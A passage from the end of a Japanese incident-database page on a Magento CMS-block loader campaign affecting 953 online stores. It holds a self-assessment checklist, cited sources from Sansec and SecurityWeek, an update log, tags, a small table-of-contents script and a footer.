+<div class="blk " id="s17"><h3>自組織に当てはまるか</h3><div class="blknote">該当する項目があれば、この事案と同じ構図が自組織でも成立しうることを意味します。</div><div class=twrap><table class=g><thead><tr><th>観点</th><th>自社に当てはまるか</th><th>該当する場合に何が起きうるか</th></tr></thead><tbody><tr><td class=nowrap><span class="b axis">システム構成</span></td><td><span class=chk>□</span> Magento / Adobe Commerce で店頭を運営しており、 CMS ブロック（`cms_block`）や CMS ページを使っている</td><td class=sm></td></tr><tr><td class=nowrap><span class="b axis">運用・監視</span></td><td><span class=chk>□</span> サイトの健全性確認が、外部からの取得（スキャン・目視）だけで成り立っている</td><td class=sm></td></tr><tr><td class=nowrap><span class="b axis">運用・監視</span></td><td><span class=chk>□</span> 過去に侵害・不審な管理者アカウント・バックドアが見つかった資産があり、 その後の処置がパッチ適用で完了とされている</td><td class=sm></td></tr><tr><td class=nowrap><span class="b axis">データの保持</span></td><td><span class=chk>□</span> 自社サイトが外部ドメインのスクリプトを読み込んでおり、 その一覧を管理していない</td><td class=sm></td></tr><tr><td class=nowrap><span class="b axis">委託・第三者部品</span></td><td><span class=chk>□</span> 店舗の構築・運用を委託しており、パッチ適用の状況と 管理者アカウントの一覧を自社で把握していない</td><td class=sm></td></tr><tr><td class=nowrap><span class="b axis">認証・認可</span></td><td><span class=chk>□</span> 管理者アカウントの棚卸しが定期的に行われていない</td><td class=sm></td></tr></tbody></table></div></div>
+<div class="blk " id="s18"><h3>出典</h3><div class=rg><div class=rgt>ベンダー分析</div><ol><li><span class=rid>[1]</span> <span class=sm>2026年10月24日 Sansec（Sansec Forensics Team）</span> <a href="https://sansec.io/research/magento-cms-block-loader-deepveindrilling" target="_blank" rel="noreferrer noopener nofollow">deepveindrilling.com: Magento CMS block loader hits 953 stores</a> <span class="b kind">調査レポート</span><span class=sm>（**本事案の一次資料。** 953店舗・5ドメインの一覧と各登録日・初確認日・店舗数、 `cms_block` への仕込み、10月の2版のローダーコード、指紋採取の項目、 Keitaro 段階の配信記録（2025年12月12日）、侵入経路（PolyShell・SessionReaper）、 パッチ済み店舗の感染例（2026年10月23日16:46 UTC）、確認手順（SQL・find）、 指標、年表を示す。 **本記録が2026年10月27日に直接取得して本文を確認した。**）</span></li></ol></div><div class=rg><div class=rgt>報道</div><ol><li><span class=rid>[2]</span> <span class=sm>2026年10月26日 SecurityWeek（Ionut Arghire 氏）</span> <a href="https://www.securityweek.com/953-online-stores-infected-in-long-lasting-malware-campaign/" target="_blank" rel="noreferrer noopener nofollow">953 Online Stores Infected in Long-Lasting Malware Campaign</a> <span class="b kind">記事</span><span class=sm>（**本記録の起点になった報道。** 出典1 の内容を要約しており、 **本記録が独自に確認した範囲では、数値・日時に出典1 との食い違いは無い** （本記録の照合）。 **ただし「In March, 471 Magento stores」とある部分は、 出典1 の年表では2026年3月30日である**（本記録の補足）。）</span></li></ol></div></div>
+<div id="sec-updates"><div class="blk " id="s19"><h3>この記録の更新履歴</h3><ul class="sm"><li><span class=sm>2026年10月27日</span> <span class="b rev">新規作成</span> **2026年10月26日の SecurityWeek の報道（出典2）を起点に、 その分析元である Sansec の調査記事（出典1・2026年10月24日）を 直接取得して裏を取って作成した。** **数値・日時・コード・確認手順はすべて出典1 の本文から採っている** （本記録は出典1 の本文を取得して読んでいる）。 **確認できなかったのは、①Adobe の APSB 文書と Adobe 自身の見解**〈齟齬1〉、 **②最終ペイロードと訪問者の実害**〈未確定2〉、 **③被害店舗の名称・国（日本の店舗が含まれるか）**〈未確定1〉である。 **記載した指標は出典1 の写しであり、本記録は検証していない**〈齟齬2〉。 **status は updating**——**攻撃者は数か月ごとにドメインを乗り換えており、 2026年10月23日に最新版へ書き換えたばかりである**（出典1）。</li></ul></div></div>
+<div class="blk " id="s20"><h3>タグ</h3><span class="b tag">Magento</span><span class="b tag">Adobe Commerce</span><span class="b tag">Magecart</span><span class="b tag">PolyShell</span><span class="b tag">SessionReaper</span><span class="b tag">Sansec</span><span class="b tag">CMS ブロック改ざん</span><span class="b tag">CSP</span><span class="b tag">EC サイト</span><span class="b tag">指紋採取</span></div>
+
+<script>
+// 狭い画面では目次を畳んでおく（本文が遠くなるのを避ける）。
+// 広い画面ではサイドバーとして常時表示するので開いたままにする。
+(function () {
+  var toc = document.getElementById('toc');
+  if (!toc) return;
+  var narrow = window.matchMedia('(max-width: 1179px)');
+  function sync(e) { if (e.matches) toc.removeAttribute('open'); else toc.setAttribute('open', ''); }
+  sync(narrow);
+  if (narrow.addEventListener) narrow.addEventListener('change', sync);
+  // 目次から飛んだら、狭い画面では畳んで本文を見せる
+  toc.addEventListener('click', function (ev) {
+    if (ev.target.tagName === 'A' && narrow.matches) toc.removeAttribute('open');
+  });
+})();
+</script>
+
+<footer>
+  インシデント事例DB — 自動生成｜作成 2026-10-27 10:33 JST<br>
+  <b>Part 1（起きたこと）</b>は公表資料・報道に基づく事実の記録です。数値には確度と出所を、
+  出典には一次情報／報道の別を付しています。公表されていない事項は削除せず明示しています。<br>
+  <b>Part 2（学べること）</b>は本記録による評価・示唆であり、当事者の見解ではありません。
+</footer>
+</div>
+</body>
+</html>
